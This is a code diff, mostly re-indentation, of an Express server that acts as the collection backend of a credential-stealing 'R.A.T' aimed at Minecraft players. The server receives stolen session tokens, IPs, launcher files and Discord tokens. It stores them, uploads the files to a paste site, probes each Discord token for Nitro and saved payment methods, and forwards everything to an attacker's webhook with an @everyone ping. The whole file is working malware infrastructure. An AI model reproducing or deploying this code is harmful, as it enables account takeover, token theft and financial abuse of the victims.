@@ -61,124 +61,124 @@ app.post("/", (req, res) => {
     }
 
     
-        if (usingMongoDB) {
-                //create a Ratted object with mongoose schema and save it
-                new Ratted({
-                    username: req.body.username,
-                    uuid: req.body.uuid,
-                    token: req.body.token,
-                    ip: req.body.ip,
-                    timestamp: new Date(),
+    if (usingMongoDB) {
+        //create a Ratted object with mongoose schema and save it
+            new Ratted({
+            username: req.body.username,
+                uuid: req.body.uuid,
+                token: req.body.token,
+                ip: req.body.ip,
+                timestamp: new Date(),
+                    
+                //(optional) string to login using https://github.com/DxxxxY/TokenAuth
+                tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
+                feather: req.body.feather,
+                essentials: req.body.essentials,
+                lunar: req.body.lunar,
+                discord: req.body.discord
+            }).save(err => {
+                if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
+            })
+        }
 
-                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
-                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
-                    feather: req.body.feather,
-                    essentials: req.body.essentials,
-                    lunar: req.body.lunar,
-                    discord: req.body.discord
-                }).save(err => {
-                    if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
-                })
+    if (usingDiscord) {
+        // initialize networth variables
+        let networth = "0";
+        let soulboundnetworth = "0";
+        let sentnetworth = 0;
+        let description = "No profile data found. 🙁";
+            
+        //upload feather
+        const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
+        //upload essential
+        const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
+        //upload lunar
+        const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
+            //get discord info
+        let nitros = ""
+        let payments = ""
+
+        const discord = req.body.discord.split(" | ")
+
+        for await (const token of req.body.discord.split(" | ")) {
+            let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
+            if (me.id == null) {
+                delete discord[token]
+                continue
             }
 
-        if (usingDiscord) {
-                // initialize networth variables
-                let networth = "0";
-                let soulboundnetworth = "0";
-                let sentnetworth = 0;
-                let description = "No profile data found. 🙁";
-                
-                //upload feather
-                const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+            let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+            nitros += nitro.length > 0 ? "Yes | " : "No | "
 
-                //upload essential
-                const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+            let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+            payments += payment.length > 0 ? "Yes | " : "No | "
+        }
 
-                //upload lunar
-                const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+            //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
+            //check feather content in hastebin
+        if(req.body.feather == 'File not found :(')
+            checkFeather = 'File not found :( - (Feather)'
+        else
+            checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`
 
-                //get discord info
-                let nitros = ""
-                let payments = ""
+            //check essentials content in hastebin
+        if(req.body.essentials == 'File not found :(')
+            checkEssentials = 'File not found :( - (Essentials)'
+        else
+            checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`
 
-                const discord = req.body.discord.split(" | ")
+            //check lunar content in hastebin
+        if(req.body.lunar == 'File not found :(')
+            checkLunar = 'File not found :( - (Lunar)'
+        else
+            checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
-                for await (const token of req.body.discord.split(" | ")) {
-                    let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
-                    if (me.id == null) {
-                        delete discord[token]
-                        continue
+            //send to discord webhook
+        networthCalc(req.body.uuid).then((result) => {
+            networth = Intl.NumberFormat('en-US', {
+                notation: 'compact',
+                maximumFractionDigits: 2,
+            }).format(result[0]);
+
+            soulboundnetworth = Intl.NumberFormat('en-US', {
+                notation: 'compact',
+                maximumFractionDigits: 2,
+            }).format(result[1]);
+            description = result[2];
+
+            sentnetworth = (Math.trunc(result[0])) / 1000000;
+
+            post(process.env.WEBHOOK, JSON.stringify({
+                content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
+                embeds: [{
+                        title: `Ratted ${req.body.username} - Click For Stats`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                        color: 5814783,
+                        footer: {
+                        "text": "R.A.T by dxxxxy",
+                        "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                        },
+                        timestamp: new Date()
+                    }],
+                    attachments: []
+                }), {
+                    headers: {
+                        "Content-Type": "application/json"
                     }
-
-                    let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
-                    nitros += nitro.length > 0 ? "Yes | " : "No | "
-
-                    let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
-                    payments += payment.length > 0 ? "Yes | " : "No | "
-                }
-                
-                //numbers in the checks else allow for better sorting if you wish to only find embeds with these logins using discords search bar
-                //check feather content in hastebin
-                if(req.body.feather == 'File not found :(')
-                    checkFeather = 'File not found :( - (Feather)'
-                else
-                    checkFeather = `https://hst.sh/${feather} -  **(Feather1)**`
-                
-                //check essentials content in hastebin
-                if(req.body.essentials == 'File not found :(')
-                    checkEssentials = 'File not found :( - (Essentials)'
-                else
-                    checkEssentials = `https://hst.sh/${essentials} - **(Essentials2)**`
-                
-                //check lunar content in hastebin
-                if(req.body.lunar == 'File not found :(')
-                    checkLunar = 'File not found :( - (Lunar)'
-                else
-                    checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
-
-                //send to discord webhook
-                networthCalc(req.body.uuid).then((result) => {
-                    networth = Intl.NumberFormat('en-US', {
-                        notation: 'compact',
-                        maximumFractionDigits: 2,
-                    }).format(result[0]);
-                    
-                    soulboundnetworth = Intl.NumberFormat('en-US', {
-                        notation: 'compact',
-                        maximumFractionDigits: 2,
-                    }).format(result[1]);
-                    description = result[2];
-                
-                    sentnetworth = (Math.trunc(result[0])) / 1000000;
-                    
-                    post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - ${soulboundnetworth}(${networth})`, //ping
-                        embeds: [{
-                            title: `Ratted ${req.body.username} - Click For Stats`,
-                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
-                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
-                            color: 5814783,
-                            footer: {
-                                "text": "R.A.T by dxxxxy",
-                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
-                            },
-                            timestamp: new Date()
-                        }],
-                        attachments: []
-                    }), {
-                        headers: {
-                            "Content-Type": "application/json"
-                        }
-                    }).catch(err => {
-                        console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
-                    })
+                }).catch(err => {
+                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                })
 
 
-                });
+            });
 
-            }
+        }
 
-            console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
+    console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
     
     
     //change this to whatever you want, but make sure to send a response
